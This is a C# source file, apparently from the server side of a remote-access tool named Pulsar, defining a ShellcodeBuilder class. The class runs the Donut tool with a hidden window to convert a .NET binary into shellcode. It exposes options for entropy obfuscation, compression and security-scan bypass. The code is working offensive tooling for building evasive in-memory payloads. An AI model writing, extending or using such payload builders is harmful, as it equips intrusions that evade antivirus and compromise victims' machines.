using System;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace Pulsar.Server.Helper
{
    public enum EntropyLevel
    {
        None = 1,
        Random = 2,
        RandomSymmetric = 3
    }

    public enum Architecture
    {
        x86 = 1,
        amd64 = 2,
        Both = 3
    }

    public enum Format
    {
        Binary = 1,
        Base64 = 2,
        C = 3,
        Ruby = 4,
        Python = 5,
        Powershell = 6,
        CSharp = 7,
        Hex = 8
    }

    public enum Compress
    {
        None = 1,
        aPLib = 2,
        LZNT1 = 3,
        Xpress = 4
    }

    public enum Bypass
    {
        None = 1,
        Abort = 2,
        Continue = 3
    }

    public enum Headers
    {
        Overwrite = 1,
        Keep = 2
    }

    public static class ShellcodeBuilder
    {
        public static byte[] GenerateShellcode(
            string binaryPath,
            string entryClass,
            string entryMethod,
            string outputBinPath,
            bool deleteOutput = true,
            string donutExePath = "",
            string clrVersion = "",
            EntropyLevel entropy = EntropyLevel.RandomSymmetric,
            Architecture arch = Architecture.Both,
            Format format = Format.Binary,
            Headers headers = Headers.Overwrite,
            Compress compression = Compress.None,
            Bypass bypass = Bypass.None
        )
        {
            if (string.IsNullOrEmpty(donutExePath))
                donutExePath = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "donut.exe");

            donutExePath = Path.GetFullPath(donutExePath);
            binaryPath = Path.GetFullPath(binaryPath);
            outputBinPath = Path.GetFullPath(outputBinPath);

            if (!File.Exists(donutExePath))
                throw new FileNotFoundException("donut.exe not found", donutExePath);

            if (!File.Exists(binaryPath))
                throw new FileNotFoundException("Input Binary not found", binaryPath);
            if (string.Equals(binaryPath, outputBinPath, StringComparison.OrdinalIgnoreCase))
                throw new ArgumentException("Donut input and output paths must differ.", nameof(outputBinPath));

            Directory.CreateDirectory(Path.GetDirectoryName(outputBinPath));
            if (File.Exists(outputBinPath))
                File.Delete(outputBinPath);

            var args = BuildArguments(
                binaryPath,
                entryClass,
                entryMethod,
                outputBinPath,
                clrVersion,
                entropy,
                arch,
                format,
                compression,
                bypass,
                headers);

            var psi = new ProcessStartInfo
            {
                FileName = donutExePath,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            foreach (var argument in args)
                psi.ArgumentList.Add(argument);

            using (Process proc = Process.Start(psi) ??
                                  throw new InvalidOperationException("Unable to start donut.exe."))
            {
                var stdout = proc.StandardOutput.ReadToEndAsync();
                var stderr = proc.StandardError.ReadToEndAsync();
                proc.WaitForExit();
                Task.WaitAll(stdout, stderr);
                if (proc.ExitCode != 0)
                {
                    throw new InvalidOperationException(
                        $"Donut failed (exit {proc.ExitCode})\nSTDOUT: {stdout.Result}\nSTDERR: {stderr.Result}");
                }
            }

            try
            {
                byte[] bytes = File.ReadAllBytes(outputBinPath);
                if (deleteOutput)
                    File.Delete(outputBinPath);

                return bytes;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException($"Failed to read generated shellcode: {ex.Message}");
            }
        }

        public static IReadOnlyList<string> BuildArguments(
            string binaryPath,
            string entryClass,
            string entryMethod,
            string outputBinPath,
            string clrVersion,
            EntropyLevel entropy,
            Architecture arch,
            Format format,
            Compress compression,
            Bypass bypass,
            Headers headers)
        {
            if (string.IsNullOrWhiteSpace(entryClass))
                throw new ArgumentException("Entry class cannot be empty.", nameof(entryClass));
            if (string.IsNullOrWhiteSpace(entryMethod))
                throw new ArgumentException("Entry method cannot be empty.", nameof(entryMethod));

            var args = new List<string>
            {
                "-e", ((int)entropy).ToString(),
                "-a", ((int)arch).ToString(),
                "-i", binaryPath,
                "-c", entryClass,
                "-m", entryMethod,
                "-o", outputBinPath,
                "-f", ((int)format).ToString(),
                "-z", ((int)compression).ToString(),
                "-b", ((int)bypass).ToString(),
                "-k", ((int)headers).ToString()
            };

            if (!string.IsNullOrWhiteSpace(clrVersion))
            {
                args.Add("-r");
                args.Add(clrVersion);
            }

            return args;
        }

        public static Compress ConvertCompressionTextToEnum(string compressionText)
        {
            return compressionText switch
            {
                "None" => Compress.None,
                "aPLib" => Compress.aPLib,
                "LZNT1" => Compress.LZNT1,
                "Xpress" => Compress.Xpress,
                _ => throw new ArgumentException($"Invalid compression type: {compressionText}")
            };
        }
    }
}